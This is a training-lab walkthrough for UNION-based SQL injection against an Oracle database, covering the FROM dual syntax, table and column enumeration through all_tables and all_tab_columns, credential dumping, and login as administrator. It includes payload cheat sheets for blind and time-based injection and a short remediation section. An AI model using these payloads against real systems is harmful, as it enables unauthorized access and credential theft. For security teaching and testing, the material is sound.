# SQL Injection Lab - Oracle Database Edition

## Lab Overview

**Objective**: Exploit a SQL injection vulnerability in an Oracle database to extract administrator credentials and gain unauthorized access.

**Difficulty**: Beginner-Intermediate  
**Time Required**: 15-30 minutes  
**Database Type**: Oracle  
**Tools Needed**: Burp Suite (Community or Pro Edition)

---

## 🔴 Oracle-Specific Important Notes

### Critical Difference: Oracle Requires FROM Clause

**Unlike MySQL/PostgreSQL/MSSQL**, Oracle databases have a unique requirement:

❌ **This will NOT work on Oracle**:
```sql
UNION SELECT 'abc','def'
```

✅ **This is required for Oracle**:
```sql
UNION SELECT 'abc','def' FROM dual
```

### What is `dual`?

**Definition**: `dual` is a special **built-in table** in Oracle databases.

**Purpose**: 
- Dummy table with one row and one column
- Used when you need to SELECT but don't need a real table
- Always available in every Oracle database

**Example**:
```sql
SELECT 'hello' FROM dual;
-- Returns: hello

SELECT 1+1 FROM dual;
-- Returns: 2

SELECT SYSDATE FROM dual;
-- Returns: Current date
```

### Oracle vs MySQL Comparison

| Feature | MySQL/PostgreSQL | Oracle |
|---------|------------------|--------|
| **Simple SELECT** | `SELECT 'test'` ✅ | `SELECT 'test'` ❌ |
| **With FROM** | `SELECT 'test' FROM dual` ✅ | `SELECT 'test' FROM dual` ✅ |
| **Column enumeration** | `UNION SELECT NULL` | `UNION SELECT NULL FROM dual` |
| **System tables** | `information_schema` | `all_tables`, `all_tab_columns` |
| **Comment syntax** | `--`, `#` | `--` only |
| **String concatenation** | `CONCAT()` or `||` | `||` only |

---

## Lab Scenario

You are testing an e-commerce website running on an Oracle database. The application allows users to filter products by category:

```
https://target-website.com/filter?category=Gifts
```

Your mission:
1. Exploit SQL injection in the `category` parameter
2. Navigate Oracle-specific syntax requirements
3. Extract administrator credentials
4. Successfully login as administrator

---

## Prerequisites

### Setup Burp Suite
1. Open Burp Suite
2. Configure browser proxy (127.0.0.1:8080)
3. Navigate to Proxy tab
4. Enable "Intercept is on"

### Identify Database Type
Before starting, confirm you're dealing with Oracle:

**Error-based detection**:
```sql
# Oracle-specific error
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

**Version detection**:
```sql
' UNION SELECT banner,NULL FROM v$version--
```

---

## Step-by-Step Exploitation

### Step 1: Intercept the Category Filter Request

**Action**: Use Burp Suite to capture the HTTP request

**Instructions**:
1. Click on a product category (e.g., "Gifts")
2. Burp Suite Proxy → Intercept tab shows the request
3. Right-click → "Send to Repeater" (Ctrl+R)

**Example captured request**:
```http
GET /filter?category=Gifts HTTP/1.1
Host: target-website.com
User-Agent: Mozilla/5.0
```

---

### Step 2: Determine Column Count (Oracle-Specific)

**Objective**: Find how many columns the SQL query returns

**⚠️ Critical**: Oracle requires `FROM dual` in UNION SELECT!

**Test Payload**:
```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

**Modified request in Repeater**:
```http
GET /filter?category='+UNION+SELECT+'abc','def'+FROM+dual-- HTTP/1.1
Host: target-website.com
```

**Instructions**:
1. Paste the payload in the `category` parameter
2. Click "Send" in Burp Repeater
3. Examine the response

---

### Understanding the Oracle Payload

```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

**Breaking it down**:

| Component | Purpose |
|-----------|---------|
| `'` | Close the original string |
| `+UNION+SELECT+` | Combine with our query (spaces = `+`) |
| `'abc','def'` | Two test values (checking 2 columns) |
| `+FROM+dual` | **Oracle requirement**: Must select FROM a table |
| `--` | Comment out the rest |

**What happens in Oracle**:
```sql
-- Original query:
SELECT product_name, description FROM products WHERE category = 'Gifts'

-- After injection:
SELECT product_name, description FROM products WHERE category = '' 
UNION SELECT 'abc','def' FROM dual--'
```

---

### Testing Different Column Counts

**If 2 columns doesn't work, try others**:

```sql
# 1 column
'+UNION+SELECT+'abc'+FROM+dual--

# 2 columns (our example)
'+UNION+SELECT+'abc','def'+FROM+dual--

# 3 columns
'+UNION+SELECT+'abc','def','ghi'+FROM+dual--

# 4 columns
'+UNION+SELECT+'abc','def','ghi','jkl'+FROM+dual--
```

**Expected Results**:

✅ **If successful** (2 columns):
- Response code: 200 OK
- Page loads normally
- May see 'abc' or 'def' displayed

❌ **If error**:
- "ORA-00913: too many values"
- "ORA-00947: not enough values"
- Try different column count

**Lab Answer**: The query returns **2 columns**, both containing text data

---

### Step 3: Retrieve List of Tables (Oracle-Specific)

**Objective**: Enumerate all tables in the Oracle database

**⚠️ Oracle Difference**: Use `all_tables` instead of `information_schema.tables`

**Payload**:
```sql
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

**Modified request**:
```http
GET /filter?category='+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/1.1
Host: target-website.com
```

---

### Oracle System Tables Reference

| MySQL/PostgreSQL | Oracle Equivalent |
|------------------|-------------------|
| `information_schema.tables` | `all_tables` or `user_tables` |
| `information_schema.columns` | `all_tab_columns` or `user_tab_columns` |
| `information_schema.schemata` | `all_users` or `dba_users` |

**Difference between Oracle views**:

- `all_tables` → All tables accessible to current user
- `user_tables` → Tables owned by current user only
- `dba_tables` → All tables in database (requires DBA privileges)

**For this lab**: Use `all_tables` to see all accessible tables

---

### Expected Response

**What you'll see in the page**:
```html
<div class="product">
    <h3>PRODUCTS</h3>
</div>
<div class="product">
    <h3>USERS_KXPQMC</h3>
</div>
<div class="product">
    <h3>ORDERS</h3>
</div>
<div class="product">
    <h3>SESSIONS</h3>
</div>
```

**Your Task**:
- Scroll through response
- Find table containing user data
- Look for: `USERS`, `ADMIN`, `ACCOUNTS`, `USERS_[random]`
- Note: **Oracle table names are usually UPPERCASE**

**Example found table**: `USERS_KXPQMC`

---

### Step 4: Identify the User Credentials Table

**From Step 3 response, locate the users table**

**Common patterns in Oracle**:
- `USERS`
- `USERS_[random]` (e.g., `USERS_KXPQMC`)
- `ADMIN_USERS`
- `MEMBERS`

**⚠️ Important**: Oracle table names are **case-sensitive** in queries when quoted!

**Write down the exact table name**:
```
Table name: USERS_KXPQMC
```

---

### Step 5: Retrieve Column Names (Oracle-Specific)

**Objective**: List all columns in the users table

**⚠️ Oracle Difference**: Use `all_tab_columns` instead of `information_schema.columns`

**Payload Template**:
```sql
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='TABLE_NAME_HERE'--
```

**⚠️ CRITICAL**: Oracle table names in system tables are **UPPERCASE**!

**Example with actual table name**:
```sql
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_KXPQMC'--
```

**Modified request**:
```http
GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_KXPQMC'-- HTTP/1.1
Host: target-website.com
```

---

### Common Oracle Mistake: Case Sensitivity

❌ **This will return NO results**:
```sql
WHERE table_name='users_kxpqmc'  -- lowercase
WHERE table_name='Users_KXPQMC'  -- mixed case
```

✅ **This is correct**:
```sql
WHERE table_name='USERS_KXPQMC'  -- UPPERCASE
```

**Why?**: Oracle stores table names in uppercase in system catalogs

---

### Expected Response

**What you'll see**:
```html
<div class="product">
    <h3>USER_ID</h3>
</div>
<div class="product">
    <h3>USERNAME_KXPQMC</h3>
</div>
<div class="product">
    <h3>PASSWORD_KXPQMC</h3>
</div>
<div class="product">
    <h3>EMAIL</h3>
</div>
<div class="product">
    <h3>CREATED_DATE</h3>
</div>
```

**Your Task**:
- Identify username column
- Identify password column
- Note: Column names also typically UPPERCASE

**Document findings**:
```
Username column: USERNAME_KXPQMC
Password column: PASSWORD_KXPQMC
```

---

### Step 6: Find Username and Password Columns

**From Step 5 response, identify**:

✅ **Username column**: Look for:
- `USERNAME`
- `USERNAME_[random]`
- `USER_NAME`
- `LOGIN`

✅ **Password column**: Look for:
- `PASSWORD`
- `PASSWORD_[random]`
- `PASS`
- `PWD`

**Example extraction**:
```
Columns found:
- USER_ID
- USERNAME_KXPQMC  ← Username column
- PASSWORD_KXPQMC  ← Password column
- EMAIL
- CREATED_DATE
```

---

### Step 7: Extract Usernames and Passwords

**Objective**: Dump all user credentials

**⚠️ Oracle Note**: Column names in SELECT can be any case, but must exist

**Payload Template**:
```sql
'+UNION+SELECT+USERNAME_COLUMN,+PASSWORD_COLUMN+FROM+TABLE_NAME--
```

**Example with actual names**:
```sql
'+UNION+SELECT+USERNAME_KXPQMC,+PASSWORD_KXPQMC+FROM+USERS_KXPQMC--
```

**Modified request**:
```http
GET /filter?category='+UNION+SELECT+USERNAME_KXPQMC,+PASSWORD_KXPQMC+FROM+USERS_KXPQMC-- HTTP/1.1
Host: target-website.com
```

---

### Understanding Oracle Column Selection

**In Oracle, you can reference columns as**:
```sql
-- Lowercase (Oracle converts to uppercase internally)
SELECT username_kxpqmc FROM users_kxpqmc

-- Uppercase (explicit)
SELECT USERNAME_KXPQMC FROM USERS_KXPQMC

-- Mixed case (if column was created with quotes)
SELECT "UserName_KXPQMC" FROM "Users_KXPQMC"
```

**Best practice for this lab**: Use **UPPERCASE** to match system catalog

---

### Expected Response

**What you'll see**:
```html
<div class="product">
    <h3>administrator</h3>
    <p>8k3m9q1w7r2t4y5z</p>
</div>
<div class="product">
    <h3>carlos</h3>
    <p>abcd1234efgh5678</p>
</div>
<div class="product">
    <h3>wiener</h3>
    <p>password123</p>
</div>
```

**Your Task**:
- Locate `administrator` username
- Copy the corresponding password
- Note: Passwords may be plaintext or hashed

**Document the credentials**:
```
Username: administrator
Password: 8k3m9q1w7r2t4y5z
```

---

### Step 8: Login as Administrator

**Objective**: Use stolen credentials for unauthorized access

**Instructions**:
1. **Disable Burp Intercept** (or turn off proxy)
2. Navigate to the login page
3. Enter credentials:
   - **Username**: `administrator`
   - **Password**: `8k3m9q1w7r2t4y5z`
4. Click "Login"

**Expected Result**:
✅ Successfully logged in as administrator  
✅ Access to admin panel  
✅ Lab marked as solved! 🎯

---

## Oracle SQL Injection - Complete Attack Chain

```
┌─────────────────────────────────────────────────┐
│  Step 1: Intercept Request                      │
│  GET /filter?category=Gifts                     │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Step 2: Test Column Count (with FROM dual)     │
│  '+UNION+SELECT+'abc','def'+FROM+dual--         │
│  Result: 2 columns confirmed                    │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Step 3: List Tables (all_tables)               │
│  '+UNION+SELECT+table_name,NULL+FROM+all_tables-│
│  Result: Found USERS_KXPQMC                     │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Step 4: Identify Users Table                   │
│  Table: USERS_KXPQMC (UPPERCASE!)               │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Step 5: List Columns (all_tab_columns)         │
│  WHERE table_name='USERS_KXPQMC'                │
│  Result: USERNAME_KXPQMC, PASSWORD_KXPQMC       │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Step 6: Identify Credential Columns            │
│  Username: USERNAME_KXPQMC                      │
│  Password: PASSWORD_KXPQMC                      │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Step 7: Extract Credentials                    │
│  SELECT USERNAME_KXPQMC,PASSWORD_KXPQMC         │
│  Result: administrator:8k3m9q1w7r2t4y5z         │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Step 8: Login as Administrator                 │
│  Lab Complete! ✓                                │
└─────────────────────────────────────────────────┘
```

---

## Oracle-Specific Payloads Reference

### Column Count Detection

```sql
# 1 column
'+UNION+SELECT+NULL+FROM+dual--

# 2 columns
'+UNION+SELECT+NULL,NULL+FROM+dual--

# 3 columns
'+UNION+SELECT+NULL,NULL,NULL+FROM+dual--

# Test with strings
'+UNION+SELECT+'abc','def'+FROM+dual--
```

### Database Version

```sql
# Oracle version
'+UNION+SELECT+banner,NULL+FROM+v$version--

# Oracle database name
'+UNION+SELECT+ora_database_name,NULL+FROM+dual--
```

### Current User

```sql
# Current user
'+UNION+SELECT+user,NULL+FROM+dual--

# Current schema
'+UNION+SELECT+SYS_CONTEXT('USERENV','CURRENT_SCHEMA'),NULL+FROM+dual--
```

### List All Databases/Schemas

```sql
# All users (schemas)
'+UNION+SELECT+username,NULL+FROM+all_users--
```

### List All Tables

```sql
# All accessible tables
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

# Tables owned by current user
'+UNION+SELECT+table_name,NULL+FROM+user_tables--

# Tables in specific schema
'+UNION+SELECT+table_name,NULL+FROM+all_tables+WHERE+owner='HR'--
```

### List All Columns

```sql
# All columns in a table
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS'--

# With data type
'+UNION+SELECT+column_name,data_type+FROM+all_tab_columns+WHERE+table_name='USERS'--

# Columns in current user's tables
'+UNION+SELECT+column_name,NULL+FROM+user_tab_columns+WHERE+table_name='USERS'--
```

### Extract Data

```sql
# Extract from table
'+UNION+SELECT+username,password+FROM+users--

# With string concatenation
'+UNION+SELECT+username||':'||password,NULL+FROM+users--

# With ROWNUM (limit results)
'+UNION+SELECT+username,password+FROM+users+WHERE+ROWNUM<=1--
```

---

## Oracle vs MySQL Quick Reference

### Basic Differences

| Task | MySQL | Oracle |
|------|-------|--------|
| **Simple SELECT** | `SELECT 1` | `SELECT 1 FROM dual` |
| **NULL test** | `UNION SELECT NULL` | `UNION SELECT NULL FROM dual` |
| **String concat** | `CONCAT('a','b')` | `'a' \|\| 'b'` |
| **Substring** | `SUBSTRING(str,1,5)` | `SUBSTR(str,1,5)` |
| **Comment** | `--` or `#` | `--` only |
| **String quotes** | `'` or `"` | `'` only |
| **System tables** | `information_schema` | `all_tables`, `dba_tables` |
| **Limit results** | `LIMIT 5` | `WHERE ROWNUM<=5` |
| **Current user** | `user()` | `user` |
| **Version** | `version()` | `SELECT banner FROM v$version` |

---

## Oracle System Tables Cheat Sheet

### User/Schema Information

```sql
-- All users (schemas)
SELECT username FROM all_users;

-- Current user
SELECT user FROM dual;

-- User privileges
SELECT * FROM session_privs;
```

### Table Information

```sql
-- All accessible tables
SELECT table_name FROM all_tables;

-- Tables owned by current user
SELECT table_name FROM user_tables;

-- All tables (DBA only)
SELECT table_name FROM dba_tables;

-- Tables with owner
SELECT owner, table_name FROM all_tables;
```

### Column Information

```sql
-- All columns in a table
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';

-- With data types
SELECT column_name, data_type FROM all_tab_columns WHERE table_name='USERS';

-- Columns owned by current user
SELECT column_name FROM user_tab_columns WHERE table_name='USERS';
```

### Views and Indexes

```sql
-- All views
SELECT view_name FROM all_views;

-- All indexes
SELECT index_name FROM all_indexes;
```

---

## Advanced Oracle Techniques

### String Concatenation

**Oracle uses `||` operator**:
```sql
'+UNION+SELECT+username||':'||password,NULL+FROM+users--
```

**Result**:
```
administrator:password123
carlos:abc456
```

---

### Limiting Results (ROWNUM)

**Oracle doesn't have `LIMIT`, uses `ROWNUM`**:

```sql
# Get first row only
'+UNION+SELECT+username,password+FROM+users+WHERE+ROWNUM<=1--

# Get rows 1-5
'+UNION+SELECT+username,password+FROM+users+WHERE+ROWNUM<=5--

# Get specific row (more complex)
'+UNION+SELECT+username,password+FROM+(SELECT+username,password,ROWNUM+as+rn+FROM+users)+WHERE+rn=2--
```

---

### Conditional Logic

**Using CASE statement**:
```sql
'+UNION+SELECT+
  CASE+WHEN+(1=1)+THEN+'TRUE'+ELSE+'FALSE'+END,
  NULL+
FROM+dual--
```

---

### Time-Based Blind SQLi

**Using DBMS_PIPE.RECEIVE_MESSAGE**:
```sql
# 5 second delay
'+AND+DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--

# Conditional delay
'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+DBMS_PIPE.RECEIVE_MESSAGE('a',5)+ELSE+0+END+FROM+dual)=1--
```

---

### Boolean-Based Blind SQLi

```sql
# Test if table exists
'+AND+(SELECT+COUNT(*)+FROM+all_tables+WHERE+table_name='USERS')>0--

# Extract data character by character
'+AND+(SELECT+SUBSTR(password,1,1)+FROM+users+WHERE+username='admin')='a'--
```

---

## Troubleshooting Oracle SQL Injection

### Problem: "ORA-00933: SQL command not properly ended"

**Cause**: Missing `FROM dual`

❌ **Wrong**:
```sql
'+UNION+SELECT+'abc','def'--
```

✅ **Correct**:
```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

---

### Problem: "ORA-00942: table or view does not exist"

**Possible causes**:

1. **Wrong table name case**
   ```sql
   # Wrong
   WHERE table_name='users'
   
   # Correct
   WHERE table_name='USERS'
   ```

2. **Table doesn't exist**
   - Verify table name from `all_tables`
   - Check owner/schema

3. **No access to table**
   - User may not have SELECT privilege
   - Try `user_tables` instead of `all_tables`

---

### Problem: "ORA-00913: too many values"

**Cause**: Too many columns in UNION SELECT

**Solution**: Reduce column count
```sql
# If this errors:
'+UNION+SELECT+'a','b','c'+FROM+dual--

# Try:
'+UNION+SELECT+'a','b'+FROM+dual--
```

---

### Problem: "ORA-00947: not enough values"

**Cause**: Too few columns in UNION SELECT

**Solution**: Add more columns
```sql
# If this errors:
'+UNION+SELECT+'a'+FROM+dual--

# Try:
'+UNION+SELECT+'a','b'+FROM+dual--
```

---

### Problem: No results from all_tab_columns

**Cause**: Table name not in UPPERCASE

❌ **Wrong**:
```sql
WHERE table_name='users_kxpqmc'
```

✅ **Correct**:
```sql
WHERE table_name='USERS_KXPQMC'
```

---

### Problem: "ORA-01789: query block has incorrect number of result columns"

**Cause**: UNION column count mismatch

**Solution**: Ensure both queries return same number of columns
```sql
-- Both must have 2 columns
SELECT name, description FROM products  -- 2 columns
UNION 
SELECT username, password FROM dual     -- 2 columns
```

---

## Oracle SQL Injection Detection

### How to Identify Oracle Database

**Method 1: Error-based**
```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',1)--
```

**Oracle-specific error**:
```
ORA-xxxxx: ...
```

**Method 2: Banner grabbing**
```sql
'+UNION+SELECT+banner,NULL+FROM+v$version--
```

**Result**:
```
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0
```

**Method 3: Dual table test**
```sql
'+UNION+SELECT+'oracle',NULL+FROM+dual--
```

**If works**: Likely Oracle database

---

## Prevention & Remediation

### For Developers

#### 1. Use Prepared Statements (Best Practice)

**Vulnerable code**:
```java
String query = "SELECT * FROM products WHERE category = '" + category + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**Secure code**:
```java
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setString(1, category);
ResultSet rs = pstmt.executeQuery();
```

---

#### 2. Input Validation

```java
String[] allowedCategories = {"Gifts", "Electronics", "Clothing"};
if (!Arrays.asList(allowedCategories).contains(category)) {
    throw new SecurityException("Invalid category");
}
```

---

#### 3. Principle of Least Privilege

**Database user should only have**:
- SELECT on required tables
- No access to system tables (all_tables, all_tab_columns)
- No DBA privileges

```sql
-- Create limited user
CREATE USER webapp_user IDENTIFIED BY password;
GRANT SELECT ON products TO webapp_user;
GRANT SELECT ON orders TO webapp_user;
-- Do NOT grant: SELECT ANY TABLE, DBA roles
```

---

#### 4. Disable Dangerous Features

```sql
-- Revoke access to system views
REVOKE SELECT ON all_tables FROM public;
REVOKE SELECT ON all_tab_columns FROM public;
```

---

## Lab Completion Checklist

```
☐ Burp Suite configured and intercepting
☐ Request sent to Repeater
☐ Column count determined (2 columns)
☐ Used FROM dual in Oracle payloads
☐ Table list retrieved from all_tables
☐ Users table identified: USERS_________
☐ Column names retrieved (UPPERCASE!)
☐ Username column found: USERNAME_________
☐ Password column found: PASSWORD_________
☐ All credentials extracted
☐ Administrator password: ________________
☐ Successfully logged in as administrator
☐ Lab marked as complete ✓
```

---

## Key Differences Summary

### Must Remember for Oracle

✅ **Always use `FROM dual`** for UNION SELECT  
✅ **Table names are UPPERCASE** in system catalogs  
✅ **Use `all_tables`** not `information_schema.tables`  
✅ **Use `all_tab_columns`** not `information_schema.columns`  
✅ **String concatenation**: Use `||` not `CONCAT()`  
✅ **Limit results**: Use `ROWNUM` not `LIMIT`  
✅ **Comments**: Only `--` works (not `#`)  

---

## Oracle SQL Injection Cheat Sheet

### Quick Reference

```sql
# Column count
'+UNION+SELECT+NULL+FROM+dual--
'+UNION+SELECT+NULL,NULL+FROM+dual--

# Database version
'+UNION+SELECT+banner,NULL+FROM+v$version--

# Current user
'+UNION+SELECT+user,NULL+FROM+dual--

# List tables
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

# List columns
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS'--

# Extract data
'+UNION+SELECT+username,password+FROM+users--

# String concatenation
'+UNION+SELECT+username||':'||password,NULL+FROM+users--

# Limit results
'+UNION+SELECT+username,password+FROM+users+WHERE+ROWNUM<=5--
```

---

## Additional Resources

### Oracle Documentation
- [Oracle SQL Language Reference](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/)
- [Oracle Data Dictionary Views](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/)

### Practice Platforms
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [HackTheBox - Oracle Challenges](https://www.hackthebox.eu/)
- [TryHackMe - SQL Injection](https://tryhackme.com/)

### Further Reading
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Oracle SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

**Congratulations on completing the Oracle SQL Injection lab!** 🎉

**Key Takeaway**: Oracle databases require special syntax (`FROM dual`, UPPERCASE table names, `all_tables`), but the exploitation methodology remains the same: enumerate, extract, exploit.

**Remember**: Use this knowledge ethically and legally. Only test systems you have explicit permission to test.